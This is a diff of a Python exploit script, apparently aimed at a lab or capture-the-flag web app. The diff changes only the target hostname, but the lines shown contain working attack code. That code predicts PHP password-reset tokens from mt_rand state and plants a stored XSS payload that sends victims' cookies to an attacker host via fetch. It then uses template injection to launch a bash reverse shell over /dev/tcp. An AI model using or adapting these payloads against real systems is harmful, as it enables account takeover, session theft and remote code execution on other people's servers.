@@ -150,7 +150,7 @@ def reset_pass(username,newpass):
     WORKERS = 40
     CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
     _N, _M, _A, _U, _L = 624, 397, 0x9908b0df, 0x80000000, 0x7fffffff
-    target = 'http://omarchy:8000'
+    target = 'http://pi5:8000'
     def php_token(seed):
         s = [0]*_N
         s[0] = seed & 0xffffffff
@@ -230,8 +230,8 @@ def reset_pass(username,newpass):
 
 
 def xss_exploit(username,newpass,lhost,http_port):
-    url_login = 'http://omarchy:8000/login.php'
-    url_exploit = 'http://omarchy:8000/profile.php'
+    url_login = 'http://pi5:8000/login.php'
+    url_exploit = 'http://pi5:8000/profile.php'
     data_login = {"username": username ,
                       "password": newpass}
     payload = f'Head of Security - TEST <script>fetch("http://{lhost}:{http_port}?cookie=" + document.cookie)</script>'
@@ -248,7 +248,7 @@ def xss_exploit(username,newpass,lhost,http_port):
                 print("exploit sent successful!")
 
 def ssti_exploit(lhost,shell_port):
-    exploit_url = "http://omarchy:8000/admin/update_motd.php"
+    exploit_url = "http://pi5:8000/admin/update_motd.php"
     try:
         payload = (f"{{php}}system(\"setsid bash -c 'bash -i >& /dev/tcp/{lhost}/{shell_port} 0>&1' 2>/dev/null &\");{{/php}}")
 
@@ -265,7 +265,7 @@ def ssti_exploit(lhost,shell_port):
               f"({'MoTD set' if ok else 'no Success marker'})")
         return ok
         requests.get(
-            "http://omarchy:8000/index.php",
+            "http://pi5:8000/index.php",
             headers={"Cookie": ADMIN_COOKIE},
             timeout=10,
             )       
@@ -316,7 +316,7 @@ def main():
                 ADMIN_COOKIE = cookie
                 print(ADMIN_COOKIE)
                 print(f"\n[+] Cookie: {cookie}")
-                r = requests.get("http://omarchy:8000/index.php",headers={"Cookie": ADMIN_COOKIE},
+                r = requests.get("http://pi5:8000/index.php",headers={"Cookie": ADMIN_COOKIE},
                     timeout=10)
                 if "Logged in as" in r.text and ">admin<" in r.text and "[Admin Section]" in r.text:
                     print("[+] admin cookie")
